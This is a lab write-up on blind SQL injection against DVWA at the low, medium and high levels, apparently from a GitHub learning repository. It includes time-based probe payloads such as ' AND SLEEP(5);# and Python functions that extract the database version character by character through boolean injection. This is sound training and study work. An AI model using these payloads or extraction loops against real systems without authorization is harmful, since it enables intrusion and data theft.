# Blind SQL Injection

## What is Blind SQL Injection? (Said by DVWA Creators)

When an attacker executes SQL injection attacks, sometimes the server responds with error messages from the database server complaining that the SQL query's syntax is incorrect. Blind SQL injection is identical to normal SQL Injection except that when an attacker attempts to exploit an application, rather than getting a useful error message, they get a generic page specified by the developer instead. This makes exploiting a potential SQL Injection attack more difficult but not impossible. An attacker can still steal data by asking a series of True and False questions through SQL statements, and monitoring how the web application response (valid entry returned or 404 header set).

## Two Primary Ways to Extract Data in a Blind Scenario

### Boolean-Based

- **How it works**: You send a query that asks a true/false question.
- **The Indicator**: You look for changes in the content of the page (e.g., "Welcome back" vs. "Login failed").

### Time-Based

- **How it works**: You tell the database to wait (pause) if a condition is true.
- **The Indicator**: You measure the response time of the server.

## Objective

I should find the version of the SQL database software through a blind SQL attack.

## LOW

To verify that the SQLi exists, we can try something like `' AND SLEEP(5);#`. If the response was delayed by 5 seconds then there is a vulnerability.

<img width="1567" height="623" alt="Screenshot from 2026-02-02 20-26-14" src="https://github.com/user-attachments/assets/195fc353-2041-48e6-bbcd-71a41bbfcf4d" />

Now we should think about something to extract the version of the SQL database, using that knock the door game.

For this, with the help of ChatGPT, I made a Python code that checks the SQL version length by iterating possible lengths to determine the SQL version length:
```python
# Find SQL version length
def get_version_length(max_len=50):
    print("Find SQL version length...")
    for length in range(1, max_len + 1):
        payload = f"1' AND LENGTH(@@version)={length}#"
        if is_true(payload):
            print(f"SQL version length: {length}")
            return length
    return None
```

And guesses the version string by guessing the characters one by one by comparing the ASCII code:
```sql
1' AND ASCII(SUBSTRING(@@version, 1, 1)) > 77# (M for example)
```

We should determine if it's capital or not by comparing it to Z (90), so we brute-force digits (0–9 → 48–57), dot (. → 46), dash (- → 45), and letters from A which is 65 to z which is 122.
```python
# Extract SQL version
def get_sql_version(length):
    print("Extract SQL version")
    version = ""
    for position in range(1, length + 1):
        for ascii_code in range(45, 123):  # -, ., digits, letters
            payload = (
                f"1' AND ASCII(SUBSTRING(@@version,{position},1))={ascii_code}#"
            )
            if is_true(payload):
                version += chr(ascii_code)
                print(f"Char {position}: {chr(ascii_code)}")
                break
    return version
```

<img width="723" height="607" alt="Screenshot from 2026-02-03 16-16-54" src="https://github.com/user-attachments/assets/041f0cb7-aaaa-4de2-b0d0-92a28273856b" />

## MEDIUM

They are trying to limit what the user can do by forcing them to select from a list instead of entering a value, but it's not clever enough.

By intercepting the request using Burp Suite, and injecting `1+or+sleep(5);#` in the id:

<img width="1567" height="870" alt="Screenshot from 2026-02-03 16-19-55" src="https://github.com/user-attachments/assets/13246dd4-6d37-495d-9507-f1873b4a686d" />


And by following the same logic as what we used in low level, and again with the help of ChatGPT, I made a Python script that automated the time-based check for determining the version of the SQL database:

<img width="894" height="619" alt="Screenshot from 2026-02-03 16-57-39" src="https://github.com/user-attachments/assets/5fb1fe98-2ea9-424e-bf8a-b820849c22e1" />

## HIGH

Here, they tried to fix the previous issues by using a new pop-up window that separates the selecting from the displaying page, still not enough. We can intercept the request from the new pop-up window and inject our SQL payload, and see the results on the home page.

<img width="1557" height="872" alt="Screenshot from 2026-02-03 17-45-47" src="https://github.com/user-attachments/assets/afea05c7-5e7e-4cf4-8649-268b4c48e93e" />


And by following the same logic as what we used in low level, and again with the help of ChatGPT, I made a Python script that automated the time-based check for determining the version of the SQL database:

<img width="905" height="634" alt="image" src="https://github.com/user-attachments/assets/59f7f0a8-d0ad-4133-a684-2d663382e0ab" />
